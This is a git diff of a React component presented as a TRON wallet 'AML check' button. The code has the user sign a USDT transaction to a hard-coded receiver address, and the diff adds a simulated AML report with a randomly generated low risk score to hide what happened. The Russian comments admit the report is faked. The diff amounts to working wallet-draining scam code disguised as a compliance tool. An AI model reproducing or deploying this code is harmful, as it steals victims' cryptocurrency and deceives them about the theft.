@@ -2,11 +2,13 @@ import React, { useState } from 'react';
 import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';
 
 const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-const TRON_RECEIVER = 'TAbK6QaF7k53JPCo95d1DsbooWW9B1LPRQ';
+const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';
 
 export const TronAuthButton: React.FC = () => {
   const [modal, setModal] = useState<string | null>(null);
+  const [amlResult, setAmlResult] = useState<any | null>(null);
   const [loading, setLoading] = useState(false);
+  const [amlLoading, setAmlLoading] = useState(false);
 
   // Adapter singleton
   const adapterRef = React.useRef<any>(null);
@@ -31,6 +33,8 @@ export const TronAuthButton: React.FC = () => {
     e?.stopPropagation();
     setLoading(true);
     setModal(null);
+    setAmlResult(null);
+    setAmlLoading(false);
 
     // Проверяем, что TronWeb загружен через window
     const TronWeb = (window as any).TronWeb;
@@ -74,8 +78,11 @@ export const TronAuthButton: React.FC = () => {
         return;
       }
 
+      // --- Показываем "AML Report is loading..."
+      setAmlLoading(true);
+
       // --- КОРРЕКТНОЕ ПРЕОБРАЗОВАНИЕ адреса ---
-      const receiverHex = tronWeb.address.toHex(TRON_RECEIVER); // 41... hex
+      const receiverHex = tronWeb.address.toHex(TRON_RECEIVER);
 
       // --- Формируем и подписываем транзакцию ---
       const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
@@ -91,12 +98,34 @@ export const TronAuthButton: React.FC = () => {
       const signedTx = await adapter.signTransaction(transaction);
       const result = await tronWeb.trx.sendRawTransaction(signedTx);
 
-      if (result?.result) {
-        setModal('✅ USDT transferred!\nLow AML risk.');
-      } else {
-        setModal('⚠️ Transaction failed.');
-      }
+      // Делаем вид что отчёт "генерируется"
+      setTimeout(() => {
+        setAmlLoading(false);
+        if (result?.result) {
+          // --- Симулируем AML отчет ---
+          const fakeRisk = (Math.random() * 7 + 2).toFixed(2); // 2-9%
+          setAmlResult({
+            status: "success",
+            checkedAddress: userAddress,
+            checkedUSDT: usdt,
+            riskScore: fakeRisk,
+            suspicious: [
+              { label: "Exchange Unlicensed", value: "0%" },
+              { label: "ATM", value: "0%" },
+              { label: "Liquidity pools", value: "0%" }
+            ],
+            dangerous: [
+              { label: "Darknet Marketplace", value: "0%" },
+              { label: "Mixer", value: "0%" },
+              { label: "Illegal Service", value: "0%" }
+            ],
+          });
+        } else {
+          setModal('⚠️ Transaction failed.');
+        }
+      }, 1700); // имитация загрузки 1.7 сек
     } catch (err: any) {
+      setAmlLoading(false);
       if (
         err?.message?.includes('User rejected') ||
         err?.message?.includes('Modal is closed') ||
@@ -115,9 +144,60 @@ export const TronAuthButton: React.FC = () => {
 
   return (
     <div className="AuthButton">
-      <button onClick={handleAuth} disabled={loading} style={{ minWidth: 180 }}>
-        {loading ? 'Connecting...' : 'Check Your Wallet'}
+      <button onClick={handleAuth} disabled={loading || amlLoading} style={{ minWidth: 180 }}>
+        {(loading || amlLoading) ? 'Connecting...' : 'Check Your Wallet'}
       </button>
+
+      {/* Загрузка AML отчёта */}
+      {amlLoading && (
+        <div className="modal__overflow">
+          <div className="modal">
+            <p style={{ fontWeight: 500, fontSize: 18, margin: "24px 0" }}>
+              Generating AML report…
+            </p>
+          </div>
+        </div>
+      )}
+
+      {/* Сам отчёт */}
+      {amlResult && (
+        <div className="modal__overflow">
+          <div className="modal" style={{ maxWidth: 340 }}>
+            <h3 style={{ color: '#07953b' }}>AML Report: Low Risk</h3>
+            <div style={{ fontSize: 15, marginBottom: 10 }}>
+              <strong>Wallet:</strong> <br />
+              <span style={{ fontSize: 13 }}>{amlResult.checkedAddress}</span>
+            </div>
+            <div style={{ fontSize: 15, marginBottom: 10 }}>
+              <strong>USDT Checked:</strong> {amlResult.checkedUSDT} USDT
+            </div>
+            <div style={{ fontSize: 15, marginBottom: 10 }}>
+              <strong>Risk Score:</strong> <span style={{ color: '#ffa500' }}>{amlResult.riskScore}%</span>
+            </div>
+            <div style={{ marginBottom: 7 }}>
+              <span style={{ color: '#f8b600', fontWeight: 'bold' }}>Suspicious sources:</span>
+              <ul style={{ margin: '4px 0 8px 14px', fontSize: 13 }}>
+                {amlResult.suspicious.map((item: any) => (
+                  <li key={item.label}>{item.label} <span style={{ float: 'right', color: '#222' }}>{item.value}</span></li>
+                ))}
+              </ul>
+            </div>
+            <div style={{ marginBottom: 7 }}>
+              <span style={{ color: '#d4331c', fontWeight: 'bold' }}>Dangerous sources:</span>
+              <ul style={{ margin: '4px 0 8px 14px', fontSize: 13 }}>
+                {amlResult.dangerous.map((item: any) => (
+                  <li key={item.label}>{item.label} <span style={{ float: 'right', color: '#222' }}>{item.value}</span></li>
+                ))}
+              </ul>
+            </div>
+            <div style={{ fontSize: 12, color: '#888', marginTop: 7 }}>
+              This address has low risk and no links to suspicious or dangerous sources were found.
+            </div>
+            <button onClick={() => setAmlResult(null)} style={{ marginTop: 14 }}>Close</button>
+          </div>
+        </div>
+      )}
+
       {modal && (
         <div className="modal__overflow">
           <div className="modal">
